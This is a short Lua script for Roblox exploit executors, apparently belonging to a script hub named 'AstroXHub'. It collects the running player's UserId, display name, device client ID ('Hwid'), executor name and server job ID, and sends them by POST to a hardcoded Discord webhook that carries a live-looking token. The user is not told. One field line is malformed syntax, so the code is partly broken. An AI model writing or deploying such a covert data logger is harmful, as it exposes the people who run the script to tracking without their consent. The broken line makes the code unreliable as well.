
local Players = game:GetService("Players")
local playerCount = #game:GetService("Players"):GetPlayers()
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ExecutorUsing = identifyexecutor()
local HttpService = game:GetService("HttpService")
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local Data =
{
    ["embeds"] = {
        {
            ["title"] = "Check Account",
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
            ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```",
            ["color"] = tonumber("0xf7c74b"),
            ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"},
            ["fields"] = {
            {
                    ["name"] = "rAnk:",
                    ["value"] = "```memeber```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Execute:",
                    ["value"] = "```"..ExecutorUsing.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Hwid:",
                    ["value"] = hwid,
                    ["inline"] = true
                },
                {
                    ["name"] = "username:",
                    ["value"] = "```.."nn"..```", 
                    ["inline"] = true
                },
                {                
                    ["name"] = "Job ID:",
                    ["value"] = ConsoleJobId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Ty For Use:",
                    ["value"] = "**__AstroXHub__**",
                    ["inline"] = true          
                }
            }              
        }
    }
}
local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)
local Request = http_request or request or HttpPost or syn.request
local Final = {Url = "https://discord.com/api/webhooks/1329670136692478023/dZySizOGSz0NrsTiK-MKrVKsaqlm2K3cPgeJ0JXMJs7NCr8iT4UBEqK2MeuW0LldfE5L", Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
